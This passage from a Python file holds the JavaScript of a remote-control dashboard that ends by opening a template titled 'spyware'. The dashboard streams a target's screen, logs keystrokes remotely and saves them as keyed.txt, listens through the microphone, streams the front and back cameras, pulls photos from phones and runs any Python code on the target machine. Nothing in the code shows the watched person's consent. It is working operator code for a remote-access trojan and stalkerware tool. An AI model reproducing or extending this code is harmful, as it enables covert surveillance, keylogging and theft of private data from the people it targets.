                method: "POST",

                headers: {
                    "Content-Type": "application/json"
                },

                body: JSON.stringify({
                    name: currentComputer
                })
            }
        );

        const result = await response.json();
        const requestId = result.request_id;

        status.textContent = "Waiting for screenshot...";

        for (let i = 0; i < 30; i++) {

            await new Promise(resolve =>
                setTimeout(resolve, 1000)
            );

            const check = await api(
                "/api/screenshot-status/" +
                encodeURIComponent(requestId)
            );

            const data = await check.json();

            if (data.status === "ready") {

                const image =
                    document.getElementById("screenshot");

                image.src =
                    "/api/latest/" +
                    encodeURIComponent(currentComputer) +
                    ".png?t=" + Date.now();

                image.hidden = false;

                status.textContent = "Screenshot received.";

                showToast(
                    "Screenshot received from " + currentComputer + ".",
                    "success",
                    "Screenshot"
                );

                return;
            }

            if (data.status === "error") {
                throw new Error(data.message);
            }
        }

        throw new Error("Screenshot timed out.");

    } catch (error) {

        status.textContent =
            "Screenshot failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Screenshot failed"
        );

    }
}


// ==================================================
// LIVE SCREEN SHARE
// ==================================================

const STREAM_REFRESH_MS = 16;

let streamRunning = false;
let streamTimer = null;
let streamObjectUrl = null;


async function toggleStream() {

    if (streamRunning) {
        await stopStream();
    } else {
        await startStream();
    }
}


async function startStream() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const button = document.getElementById("streamButton");
    const status = document.getElementById("streamStatus");
    const image = document.getElementById("streamImage");

    try {

        status.textContent = "Starting screen share...";

        await api("/api/stream/start", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

        streamRunning = true;

        button.textContent = "Stop Screen Share";
        image.hidden = false;
        status.textContent = "Waiting for the first frame...";

        logEvent(
            "success",
            "Screen share started for " + currentComputer + "."
        );

        pollStream();

    } catch (error) {

        status.textContent =
            "Screen share failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Screen share failed"
        );

    }
}


async function stopStream() {

    const button = document.getElementById("streamButton");
    const status = document.getElementById("streamStatus");

    streamRunning = false;

    clearTimeout(streamTimer);

    button.textContent = "Start Screen Share";
    status.textContent = "Screen share is off.";

    if (!currentComputer) {
        return;
    }

    try {

        await api("/api/stream/stop", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

    } catch (error) {

        console.error(error);

        logEvent(
            "warn",
            "Could not stop screen share: " + error.message
        );
    }
}


async function pollStream() {

    if (!streamRunning) {
        return;
    }

    const status = document.getElementById("streamStatus");
    const image = document.getElementById("streamImage");

    try {

        const response = await fetch(
            "/api/stream/frame/" +
            encodeURIComponent(currentComputer) +
            "?t=" + Date.now(),
            { cache: "no-store" }
        );

        if (response.ok) {

            const blob = await response.blob();

            if (streamObjectUrl) {
                URL.revokeObjectURL(streamObjectUrl);
            }

            streamObjectUrl = URL.createObjectURL(blob);
            image.src = streamObjectUrl;

            status.textContent =
                "Live screen share - " +
                new Date().toLocaleTimeString();
        }

    } catch (error) {
        console.error(error);
    }

    if (streamRunning) {
        streamTimer = setTimeout(
            pollStream,
            STREAM_REFRESH_MS
        );
    }
}


// ==================================================
// LIVE SCREEN PREVIEW
// ==================================================

const LIVE_VIEWER =
    "preview-" + Math.random().toString(36).slice(2, 10);

let liveMaximized = false;
let liveRunning = false;
let liveRafId = null;
let liveObjectUrl = null;
let liveFrameReady = false;
let liveFrameComputer = "";
let liveComputer = "";
let liveFailures = 0;
let liveSession = 0;
let liveMouseDown = false;
let liveModifiers = { Control: false, Alt: false, Shift: false, Meta: false };


function liveStage() {
    return document.getElementById("liveStage");
}


function setLiveBadge(mode, text) {
    const badge = document.getElementById("liveScreenStatus");
    const label = document.getElementById("liveScreenStatusText");
    if (!badge) return;
    badge.classList.toggle("live", mode === "live");
    badge.classList.toggle("busy", mode === "busy");
    if (label) label.textContent = text;
}


function liveToggleMaximize() {
    if (liveMaximized) {
        liveMinimize();
    } else {
        liveMaximize();
    }
}


function liveMaximize() {
    liveMaximized = true;
    liveStage().hidden = false;
    liveStage().classList.remove("minimized");
    document.getElementById("liveModeBar").hidden = false;
    document.getElementById("liveToggleBtn").textContent = "Minimize";
    liveSetMode(liveInputMode);
    if (!currentComputer) {
        setLiveBadge("idle", "Connect to a computer");
        return;
    }
    liveScreenStart();
}


function liveMinimize() {
    liveMaximized = false;
    liveStage().hidden = true;
    liveStage().classList.add("minimized");
    liveStage().classList.remove("visible", "has-frame");
    document.getElementById("liveModeBar").hidden = true;
    document.getElementById("liveKeyboard").hidden = true;
    document.getElementById("liveKeyboard").classList.remove("visible");
    document.getElementById("liveKeysPanel").hidden = true;
    document.getElementById("liveToggleBtn").textContent = "Maximize";
    liveScreenStop("minimize");
    setLiveBadge("idle", "Minimized");
}


async function liveScreenStart() {
    const name = currentComputer;
    if (!name) return;
    if (liveRunning && liveComputer === name) return;
    if (liveRunning || liveComputer) liveScreenStop("switch");

    const session = ++liveSession;
    liveComputer = name;
    liveFrameReady = false;
    liveFailures = 0;

    if (liveFrameComputer !== name) liveStage().classList.remove("has-frame");

    setLiveBadge("busy", "Connecting...");

    try {
        await api("/api/stream/start", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: name, viewer: LIVE_VIEWER })
        });
    } catch (error) {
        if (session !== liveSession) return;
        liveComputer = "";
        setLiveBadge("idle", "Unavailable");
        showToast(error.message, "error", "Live screen");
        return;
    }

    if (session !== liveSession) return;
    if (!liveMaximized) { liveScreenStop("left"); return; }

    liveRunning = true;
    liveStage().hidden = false;
    liveStage().classList.add("visible");
    if (liveInputMode === "keys") startRemoteKeyFeed();
    livePollPreview(session);
}


function liveScreenStop(reason) {
    const name = liveComputer;
    const wasRunning = liveRunning;

    if (reason === "switch" || reason === "reset") {
        stopRemoteKeyFeed();
    }

    liveSession += 1;
    if (liveRafId) { cancelAnimationFrame(liveRafId); liveRafId = null; }
    liveRunning = false;
    liveComputer = "";
    liveFrameReady = false;

    if (reason !== "reset" && reason !== "minimize") setLiveBadge("idle", "Paused");

    if (!wasRunning || !name) return;

    fetch("/api/stream/stop", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        keepalive: true,
        body: JSON.stringify({ name: name, viewer: LIVE_VIEWER })
    }).catch(function() {});
}


function liveScreenReset() {
    liveMaximized = false;
    capturedKeys = "";
    renderKeyLine();
    liveSetMode("keyboard");
    liveStage().hidden = true;
    liveStage().classList.add("minimized");
    liveStage().classList.remove("visible", "has-frame");
    document.getElementById("liveModeBar").hidden = true;
    document.getElementById("liveKeyboard").hidden = true;
    document.getElementById("liveKeyboard").classList.remove("visible");
    document.getElementById("liveKeysPanel").hidden = true;
    const image = document.getElementById("liveScreenImage");
    image.hidden = true;
    image.removeAttribute("src");
    document.getElementById("liveToggleBtn").textContent = "Maximize";
    liveFrameComputer = "";
    liveScreenStop("reset");
    setLiveBadge("idle", "Minimized");
}


async function livePollPreview(session) {
    if (!liveRunning || session !== liveSession) return;

    const name = liveComputer;
    const stage = liveStage();
    const image = document.getElementById("liveScreenImage");

    try {
        const response = await fetch(
            "/api/stream/frame/" + encodeURIComponent(name) + "?t=" + Date.now(),
            { cache: "no-store" }
        );

        if (session !== liveSession) return;

        if (response.ok) {
            const blob = await response.blob();
            if (session !== liveSession) return;
            if (liveObjectUrl) URL.revokeObjectURL(liveObjectUrl);
            liveObjectUrl = URL.createObjectURL(blob);
            image.src = liveObjectUrl;
            image.hidden = false;
            liveFailures = 0;
            liveFrameComputer = name;
            if (!liveFrameReady) { liveFrameReady = true; stage.classList.add("has-frame"); }
            setLiveBadge("live", "Live \u2014 " + name);
        } else if (response.status === 404) {
            liveFailures += 1;
            if (liveFailures > 300) throw new Error("No frames received.");
        } else {
            let message = "Live screen unavailable.";
            try { const data = await response.json(); message = data.error || message; } catch {}
            throw new Error(message);
        }
    } catch (error) {
        if (session !== liveSession) return;
        liveScreenStop("error");
        setLiveBadge("idle", "Unavailable");
        showToast(error.message, "error", "Live screen");
        return;
    }

    if (liveRunning && session === liveSession) {
        liveRafId = requestAnimationFrame(function() { livePollPreview(session); });
    }
}


function liveCoords(event) {
    const stage = liveStage();
    const image = document.getElementById("liveScreenImage");
    const rect = image.getBoundingClientRect();
    const nw = image.naturalWidth || 16;
    const nh = image.naturalHeight || 9;
    const scale = Math.min(rect.width / nw, rect.height / nh);
    const w = nw * scale, h = nh * scale;
    const left = rect.left + (rect.width - w) / 2;
    const top = rect.top + (rect.height - h) / 2;
    const x = (event.clientX - left) / w;
    const y = (event.clientY - top) / h;
    if (x < 0 || x > 1 || y < 0 || y > 1) return null;
    return { x, y, rx: event.clientX - rect.left, ry: event.clientY - rect.top };
}


async function liveSendMouse(action, coords) {
    if (!liveComputer) return;
    try {
        await api("/api/remote-mouse", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: liveComputer, action, x: coords.x, y: coords.y })
        });
    } catch (e) { showToast(e.message, "error", "Remote mouse"); }
}


async function liveScreenClick(event) {
    if (!liveMaximized || !liveRunning || !liveFrameReady || !liveComputer) return;
    const coords = liveCoords(event);
    if (!coords) return;
    liveRipple(coords.rx, coords.ry);
    await liveSendMouse("click", coords);
}


async function liveScreenMouseDown(event) {
    if (!liveMaximized || !liveRunning || !liveFrameReady || !liveComputer) return;
    if (event.button !== 0) return;
    const coords = liveCoords(event);
    if (!coords) return;
    liveMouseDown = true;
    await liveSendMouse("down", coords);
}


async function liveScreenMouseUp(event) {
    if (!liveMouseDown) return;
    liveMouseDown = false;
    const coords = liveCoords(event) || { x: 0.5, y: 0.5 };
    await liveSendMouse("up", coords);
}


async function liveScreenScroll(event) {
    if (!liveMaximized || !liveRunning || !liveFrameReady || !liveComputer) return;
    event.preventDefault();
    const coords = liveCoords(event) || { x: 0.5, y: 0.5 };
    const delta = event.deltaY > 0 ? -3 : 3;
    try {
        await api("/api/remote-scroll", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: liveComputer, x: coords.x, y: coords.y, delta })
        });
    } catch (e) { showToast(e.message, "error", "Remote scroll"); }
}


function liveRipple(left, top) {
    if (!siteStyles || !siteStyles.isConnected) return;
    const dot = document.createElement("span");
    dot.className = "live-ripple";
    dot.style.left = left + "px";
    dot.style.top = top + "px";
    liveStage().appendChild(dot);
    setTimeout(function() { dot.remove(); }, 560);
}


// ------------------------------------------------------------------ keyboard

async function liveSendKey(key, type) {
    if (!liveComputer) return;
    try {
        await api("/api/remote-key", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: liveComputer, key, type })
        });
    } catch (e) { showToast(e.message, "error", "Remote key"); }
}


function liveKbKeyPress(btn) {
    const key = btn.dataset.key;
    const isModifier = ["Control", "Alt", "Shift", "Meta"].includes(key);
    if (isModifier) {
        liveModifiers[key] = !liveModifiers[key];
        btn.classList.toggle("pressed", liveModifiers[key]);
        liveSendKey(key, liveModifiers[key] ? "down" : "up");
    } else {
        btn.classList.add("pressed");
        setTimeout(() => btn.classList.remove("pressed"), 150);
        liveSendKey(key, "press");
    }
}


async function liveKbSendText() {
    const input = document.getElementById("liveKbInput");
    const text = input.value;
    if (!text || !liveComputer) return;
    input.value = "";
    try {
        await api("/api/remote-key", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ name: liveComputer, text })
        });
    } catch (e) { showToast(e.message, "error", "Remote text"); }
}


// ------------------------------------------------------------------ key modes

let liveInputMode = "keyboard";
let capturedKeys = "";


function liveSetMode(mode) {
    liveInputMode = mode === "keys" ? "keys" : "keyboard";
    document.querySelectorAll(".live-mode-btn").forEach(function(btn) {
        btn.classList.toggle("active", btn.dataset.mode === liveInputMode);
    });
    const keyboard = document.getElementById("liveKeyboard");
    const showKeyboard = liveMaximized && liveInputMode === "keyboard";
    keyboard.hidden = !showKeyboard;
    keyboard.classList.toggle("visible", showKeyboard);
    document.getElementById("liveKeysPanel").hidden =
        !(liveMaximized && liveInputMode === "keys");
    if (liveMaximized && liveInputMode === "keys") {
        startRemoteKeyFeed();
    } else {
        stopRemoteKeyFeed();
    }
}


function renderKeyLine() {
    const line = document.getElementById("keyLine");
    if (!line) return;
    line.textContent = capturedKeys;
    line.scrollTop = line.scrollHeight;
    line.scrollLeft = line.scrollWidth;
}


function recordKeyInput(value) {
    if (!value) return;
    capturedKeys += value;
    renderKeyLine();
}


function recordSpecialKey(label) {
    if (!label) return;
    if (capturedKeys && !capturedKeys.endsWith("\n")) capturedKeys += "\n";
    capturedKeys += label + "\n";
    renderKeyLine();
}


let remoteKeySession = 0;
let remoteKeyAfter = 0;
let remoteKeyComputer = "";
let remoteKeyTimer = null;
let remoteKeyStarted = false;


function startRemoteKeyFeed() {
    const name = liveComputer || currentComputer;
    if (!name) return;

    if (remoteKeyComputer !== name) {
        stopRemoteKeyFeed();
        remoteKeyComputer = name;
        remoteKeyStarted = false;
        remoteKeyAfter = 0;
        capturedKeys = "";
        renderKeyLine();
    }

    if (remoteKeyStarted) {
        if (!remoteKeyTimer) pollRemoteKeys(++remoteKeySession);
        return;
    }

    remoteKeyStarted = true;
    remoteKeyAfter = 0;
    const session = ++remoteKeySession;
    api("/api/keys/start", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name: name })
    }).then(function() {
        if (session === remoteKeySession) pollRemoteKeys(session);
    }).catch(function(e) {
        if (session === remoteKeySession) {
            remoteKeyStarted = false;
            showToast(e.message, "error", "See keys");
        }
    });
}


function stopRemoteKeyFeed() {
    remoteKeySession += 1;
    clearTimeout(remoteKeyTimer);
    remoteKeyTimer = null;
    const name = remoteKeyComputer;
    remoteKeyComputer = "";
    remoteKeyStarted = false;
    remoteKeyAfter = 0;
    if (!name) return;
    fetch("/api/keys/stop", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        keepalive: true,
        body: JSON.stringify({ name: name })
    }).catch(function() {});
}


async function pollRemoteKeys(session) {
    if (session !== remoteKeySession || !remoteKeyComputer) return;
    const name = remoteKeyComputer;
    let watchdog = null;
    try {
        const controller = new AbortController();
        watchdog = setTimeout(function() { controller.abort(); }, 10000);
        const response = await fetch(
            "/api/keys?name=" + encodeURIComponent(name) +
            "&after=" + remoteKeyAfter,
            { cache: "no-store", signal: controller.signal }
        );
        if (session !== remoteKeySession) return;
        if (response.ok) {
            const data = await response.json();
            if (session !== remoteKeySession) return;
            (data.events || []).forEach(function(event) {
                if (event.type === "special") recordSpecialKey(event.value);
                else recordKeyInput(event.value);
            });
            if (typeof data.next === "number") remoteKeyAfter = data.next;
        }
    } catch (error) {
    } finally {
        clearTimeout(watchdog);
    }
    if (session === remoteKeySession && remoteKeyComputer) {
        remoteKeyTimer = setTimeout(function() { pollRemoteKeys(session); }, 700);
    }
}


function downloadKeyLog() {
    const blob = new Blob([capturedKeys], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = "keyed.txt";
    document.body.appendChild(link);
    link.click();
    link.remove();
    setTimeout(function() { URL.revokeObjectURL(url); }, 2000);
}


document.querySelectorAll(".kb-key[data-key]").forEach(function(btn) {
    btn.addEventListener("click", function() { liveKbKeyPress(btn); });
});

document.getElementById("liveKbInput").addEventListener("keydown", function(e) {
    if (e.key === "Enter") { e.preventDefault(); liveKbSendText(); }
});


document.getElementById("liveStage").addEventListener("click", liveScreenClick);
document.getElementById("liveStage").addEventListener("mousedown", liveScreenMouseDown);
document.getElementById("liveStage").addEventListener("mouseup", liveScreenMouseUp);
document.getElementById("liveStage").addEventListener("wheel", liveScreenScroll, { passive: false });

window.addEventListener("mouseup", function() {
    if (liveMouseDown) { liveMouseDown = false; liveSendMouse("up", { x: 0.5, y: 0.5 }); }
});

window.addEventListener("pagehide", function() {
    if (!liveRunning || !liveComputer) return;
    const name = liveComputer;
    liveRunning = false;
    fetch("/api/stream/stop", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        keepalive: true,
        body: JSON.stringify({ name: name, viewer: LIVE_VIEWER })
    }).catch(function() {});
});

document.addEventListener("visibilitychange", function() {
    if (document.hidden && liveRunning) liveScreenStop("hidden");
});


// ==================================================
// REMOTE MICROPHONE
// ==================================================

const MIC_POLL_MS = 250;

let micRunning = false;
let micTimer = null;
let micContext = null;
let micPlayhead = 0;
let micSeq = -1;


async function toggleMicrophone() {

    if (micRunning) {
        await stopMicrophone();
    } else {
        await startMicrophone();
    }
}


async function startMicrophone() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const button = document.getElementById("micButton");
    const status = document.getElementById("micStatus");

    try {

        status.textContent = "Starting microphone...";

        await api("/api/mic/start", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

        if (!micContext) {
            micContext = new (
                window.AudioContext ||
                window.webkitAudioContext
            )();
        }

        if (micContext.state === "suspended") {
            await micContext.resume();
        }

        micSeq = -1;
        micPlayhead = 0;
        micRunning = true;

        button.textContent = "Stop Listening";
        status.textContent = "Waiting for audio...";

        logEvent(
            "success",
            "Microphone started for " + currentComputer + "."
        );

        pollMicrophone();

    } catch (error) {

        status.textContent =
            "Microphone failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Microphone failed"
        );

    }
}


async function stopMicrophone() {

    const button = document.getElementById("micButton");
    const status = document.getElementById("micStatus");

    micRunning = false;
    clearTimeout(micTimer);

    button.textContent = "Start Listening";
    status.textContent = "Microphone is off.";

    document.getElementById("micLevel").value = 0;

    if (micContext && micContext.state === "running") {

        try {
            await micContext.suspend();
        } catch {}
    }

    if (!currentComputer) {
        return;
    }

    try {

        await api("/api/mic/stop", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

    } catch (error) {
        console.error(error);
    }
}


function playAudioChunks(chunks, rate) {

    let peak = 0;

    for (const chunk of chunks) {

        const binary = atob(chunk.data);
        const bytes = new Uint8Array(binary.length);

        for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }

        const samples = new Int16Array(
            bytes.buffer,
            0,
            bytes.length >> 1
        );

        if (!samples.length) {
            continue;
        }

        const buffer = micContext.createBuffer(
            1,
            samples.length,
            rate
        );

        const output = buffer.getChannelData(0);

        for (let i = 0; i < samples.length; i++) {

            const value = samples[i] / 32768;

            output[i] = value;

            const magnitude = Math.abs(value);

            if (magnitude > peak) {
                peak = magnitude;
            }
        }

        const source = micContext.createBufferSource();

        source.buffer = buffer;
        source.connect(micContext.destination);

        const now = micContext.currentTime;

        if (micPlayhead < now + 0.02) {
            micPlayhead = now + 0.05;
        }

        source.start(micPlayhead);

        micPlayhead += buffer.duration;
        micSeq = chunk.seq;
    }

    return peak;
}


async function pollMicrophone() {

    if (!micRunning) {
        return;
    }

    const status = document.getElementById("micStatus");
    const level = document.getElementById("micLevel");

    try {

        const response = await api(
            "/api/mic/chunks?name=" +
            encodeURIComponent(currentComputer) +
            "&since=" + micSeq
        );

        const data = await response.json();

        if (data.error) {

            micRunning = false;
            clearTimeout(micTimer);

            document.getElementById("micButton").textContent =
                "Start Listening";

            level.value = 0;
            status.textContent =
                "Microphone failed: " + data.error;

            showToast(
                data.error,
                "error",
                "Microphone failed"
            );

            return;
        }

        if (!data.active) {

            micRunning = false;
            clearTimeout(micTimer);

            document.getElementById("micButton").textContent =
                "Start Listening";

            level.value = 0;
            status.textContent =
                "Microphone stopped on the computer.";

            logEvent(
                "info",
                "Microphone stopped on " + currentComputer + "."
            );

            return;
        }

        const peak = playAudioChunks(data.chunks, data.rate);

        if (data.chunks.length) {
            status.textContent =
                "Listening - " +
                new Date().toLocaleTimeString();
        }

        level.value =
            Math.min(100, Math.round(peak * 160));

    } catch (error) {
        console.error(error);
    }

    if (micRunning) {
        micTimer = setTimeout(pollMicrophone, MIC_POLL_MS);
    }
}


// ==================================================
// REMOTE CAMERA
// ==================================================

const CAMERA_REFRESH_MS = 500;

let cameraRunning = false;
let cameraTimer = null;
let cameraObjectUrls = {
    back: null,
    front: null
};

let snapshotBusy = false;
let snapshotObjectUrl = null;


function cameraFeed(camera) {
    return camera === "front"
        ? document.getElementById("cameraImageFront")
        : document.getElementById("cameraImage");
}


function revokeCameraFrames() {
    for (const camera of Object.keys(cameraObjectUrls)) {
        if (cameraObjectUrls[camera]) {
            URL.revokeObjectURL(cameraObjectUrls[camera]);
            cameraObjectUrls[camera] = null;
        }
    }
}


function resetSnapshot() {

    const image = document.getElementById("cameraSnapshotImage");

    if (image) {
        image.hidden = true;
        image.removeAttribute("src");
    }

    if (snapshotObjectUrl) {
        URL.revokeObjectURL(snapshotObjectUrl);
        snapshotObjectUrl = null;
    }
}


async function captureCameraFrame() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    if (snapshotBusy) {
        return;
    }

    const target = currentComputer;
    const button = document.getElementById("cameraSnapshotButton");

    snapshotBusy = true;
    button.disabled = true;

    try {

        const response = await api("/api/camera/snapshot", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: target
            })
        });

        const request = await response.json();

        let frame = null;

        if (request.immediate) {

            frame = await fetch(
                "/api/camera/frame/" +
                encodeURIComponent(target) +
                "?camera=back&t=" + Date.now(),
                { cache: "no-store" }
            );

        } else {

            const deadline = Date.now() + 15000;

            while (Date.now() < deadline) {

                frame = await fetch(
                    "/api/camera/snapshot/" +
                    encodeURIComponent(request.request_id) +
                    "?t=" + Date.now(),
                    { cache: "no-store" }
                );

                if (frame.status !== 202) {
                    break;
                }

                await new Promise(resolve => setTimeout(resolve, 400));
            }
        }

        if (!frame || !frame.ok) {

            let message = "The camera did not send a frame.";

            if (frame) {
                try {
                    const data = await frame.json();
                    message = data.error || message;
                } catch {}
            }

            throw new Error(message);
        }

        const blob = await frame.blob();

        if (target !== currentComputer) {
            return;
        }

        const image = document.getElementById("cameraSnapshotImage");

        if (snapshotObjectUrl) {
            URL.revokeObjectURL(snapshotObjectUrl);
        }

        snapshotObjectUrl = URL.createObjectURL(blob);
        image.src = snapshotObjectUrl;
        image.hidden = false;

        logEvent(
            "success",
            "Captured a single camera frame from " + target + "."
        );

    } catch (error) {

        showToast(
            error.message,
            "error",
            "Camera snapshot failed"
        );

        logEvent(
            "warn",
            "Camera snapshot failed: " + error.message
        );

    } finally {

        snapshotBusy = false;
        button.disabled = false;
    }
}


async function toggleCamera() {

    if (cameraRunning) {
        await stopCamera();
    } else {
        await startCamera();
    }
}


async function startCamera() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const button = document.getElementById("cameraButton");
    const status = document.getElementById("cameraStatus");

    try {

        status.textContent = "Starting camera...";

        await api("/api/camera/start", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

        cameraRunning = true;

        button.textContent = "Stop Camera";
        cameraFeed("back").hidden = true;
        cameraFeed("front").hidden = true;
        status.textContent = "Waiting for the camera...";

        logEvent(
            "success",
            "Camera started for " + currentComputer + "."
        );

        pollCamera();

    } catch (error) {

        status.textContent =
            "Camera failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Camera failed"
        );

    }
}


function finishCameraStop(message) {

    cameraRunning = false;
    clearTimeout(cameraTimer);
    cameraTimer = null;

    document.getElementById("cameraButton").textContent = "Start Camera";
    document.getElementById("cameraStatus").textContent = message;
    cameraFeed("back").hidden = true;
    cameraFeed("front").hidden = true;

    revokeCameraFrames();
    resetSnapshot();

    showToast(
        message,
        "error",
        "Camera stopped"
    );
}


async function stopCamera() {

    const button = document.getElementById("cameraButton");
    const status = document.getElementById("cameraStatus");

    cameraRunning = false;
    clearTimeout(cameraTimer);
    cameraTimer = null;

    button.textContent = "Start Camera";
    status.textContent = "Camera is off.";
    cameraFeed("back").hidden = true;
    cameraFeed("front").hidden = true;

    revokeCameraFrames();
    resetSnapshot();

    if (!currentComputer) {
        return;
    }

    try {

        await api("/api/camera/stop", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

    } catch (error) {

        console.error(error);

        logEvent(
            "warn",
            "Could not stop camera: " + error.message
        );
    }
}


async function pollCameraFeed(camera) {

    try {

        const response = await fetch(
            "/api/camera/frame/" +
            encodeURIComponent(currentComputer) +
            "?camera=" + camera +
            "&t=" + Date.now(),
            { cache: "no-store" }
        );

        if (response.ok) {

            const blob = await response.blob();
            const image = cameraFeed(camera);

            if (cameraObjectUrls[camera]) {
                URL.revokeObjectURL(cameraObjectUrls[camera]);
            }

            cameraObjectUrls[camera] = URL.createObjectURL(blob);
            image.src = cameraObjectUrls[camera];
            image.hidden = false;

            return { live: true, error: "" };
        }

        let message = "Waiting for the camera...";

        try {
            const data = await response.json();
            message = data.error || message;
        } catch {}

        if (message === "No frame available") {
            message = "Waiting for the camera...";
        }

        return { live: false, error: message };

    } catch (error) {

        console.error(error);
        return { live: false, error: "" };
    }
}


async function pollCamera() {

    if (!cameraRunning) {
        return;
    }

    const status = document.getElementById("cameraStatus");

    const results = await Promise.all([
        pollCameraFeed("back"),
        pollCameraFeed("front")
    ]);

    if (!cameraRunning) {
        return;
    }

    const live = results.some(result => result.live);
    const fatal = results[0].error;

    if (live) {

        status.textContent =
            "Live camera - " +
            new Date().toLocaleTimeString();

    } else if (fatal && fatal !== "Waiting for the camera...") {

        finishCameraStop(fatal);
        return;

    } else {

        status.textContent = "Waiting for the camera...";
    }

    cameraTimer = setTimeout(
        pollCamera,
        CAMERA_REFRESH_MS
    );
}


// ==================================================
// MOBILE PICTURES
// ==================================================

async function requestPhotos() {

    if (!currentComputer || currentKind !== "mobile") {
        return;
    }

    try {

        await api("/api/photos/request", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer
            })
        });

        document.getElementById("photoStatus").textContent =
            "Request sent. Pick the pictures on the phone.";

        showToast(
            "Request sent to " + currentComputer + ".",
            "info",
            "Pictures"
        );

    } catch (error) {

        showToast(error.message, "error", "Pictures failed");
    }
}


async function loadPhotos() {

    if (!currentComputer || currentKind !== "mobile") {
        return;
    }

    try {

        const response = await api(
            "/api/photos?name=" + encodeURIComponent(currentComputer)
        );

        const data = await response.json();

        if (currentKind !== "mobile") {
            return;
        }

        renderPhotos(data.photos || []);

    } catch (error) {
    }
}


function renderPhotos(photos) {

    const grid = document.getElementById("photoGrid");
    const status = document.getElementById("photoStatus");

    grid.textContent = "";

    if (!photos.length) {
        status.textContent =
            "No pictures yet. Press Request pictures and pick them on the phone.";
        return;
    }

    status.textContent = photos.length + " picture(s) received.";

    photos.forEach(photo => {

        const link = document.createElement("a");

        link.className = "photo-card";
        link.href =
            "/api/photo/" +
            encodeURIComponent(currentComputer) +
            "/" + encodeURIComponent(photo.id);
        link.target = "_blank";
        link.rel = "noopener";

        const image = document.createElement("img");

        image.src = link.href;
        image.alt = photo.name;
        image.loading = "lazy";

        const caption = document.createElement("span");

        caption.textContent =
            photo.name + " \u00b7 " +
            Math.max(1, Math.round(photo.size / 1024)) + " KB";

        link.appendChild(image);
        link.appendChild(caption);
        grid.appendChild(link);
    });
}


// ==================================================
// REMOTE PYTHON RUNNER
// ==================================================

const PYTHON_POLL_MS = 700;


async function waitForPythonResult(requestId) {

    const deadline = Date.now() + 180000;

    while (Date.now() < deadline) {

        await new Promise(
            resolve => setTimeout(resolve, PYTHON_POLL_MS)
        );

        const response = await fetch(
            "/api/python/result/" +
            encodeURIComponent(requestId)
        );

        const data = await response.json();

        if (!response.ok) {
            throw new Error(
                data.error || "Result unavailable."
            );
        }

        if (data.status === "ready") {
            return data;
        }
    }

    throw new Error(
        "Timed out waiting for the remote computer."
    );
}


async function runPython() {

    if (!currentComputer) {
        showToast("Connect to a computer first.", "error", "No computer selected");
        return;
    }

    const codeInput = document.getElementById("pythonCode");
    const button = document.getElementById("pythonRunButton");
    const status = document.getElementById("pythonStatus");
    const output = document.getElementById("pythonOutput");

    const code = codeInput.value;

    if (!code.trim()) {
        status.textContent = "Paste some Python code first.";
        showToast(
            "Paste some Python code first.",
            "warn",
            "Nothing to run"
        );
        return;
    }

    button.disabled = true;
    output.hidden = true;
    output.textContent = "";

    status.textContent =
        "Running Python code on " + currentComputer + "...";

    try {

        const response = await api("/api/python/run", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                name: currentComputer,
                code: code
            })
        });

        const data = await response.json();

        const result = await waitForPythonResult(
            data.request_id
        );

        status.textContent =
            "Finished with exit code " +
            result.exit_code + ".";

        output.hidden = false;
        output.textContent = result.output
            ? result.output.replace(/\s+$/, "")
            : "(No output.)";

        showToast(
            "Finished with exit code " + result.exit_code + ".",
            "success",
            "Python finished"
        );

    } catch (error) {

        status.textContent =
            "Python run failed: " + error.message;

        showToast(
            error.message,
            "error",
            "Python run failed"
        );

    } finally {

        button.disabled = false;
    }
}


document.getElementById("pythonCode")
    .addEventListener("keydown", function(event) {

        if (event.key === "Enter" && (event.ctrlKey || event.metaKey)) {
            event.preventDefault();
            runPython();
        }
    });


// ==================================================
// INITIALIZATION
// ==================================================

setInterval(refreshComputers, 5000);

setInterval(pollLogs, 3000);

setInterval(pollSiteLogs, 3000);

pollLogs().then(() => {
    logEvent("info", "Dashboard opened.");
});

pollSiteLogs();

consoleSetTarget();

refreshComputers();

</script>

</body>
</html>
"""


# ==================================================
# TERMINAL-STYLE CONSOLE
# ==================================================

CONSOLE_HTML = r"""
<!DOCTYPE html>
<html>
<head>
    <title>spyware</title>

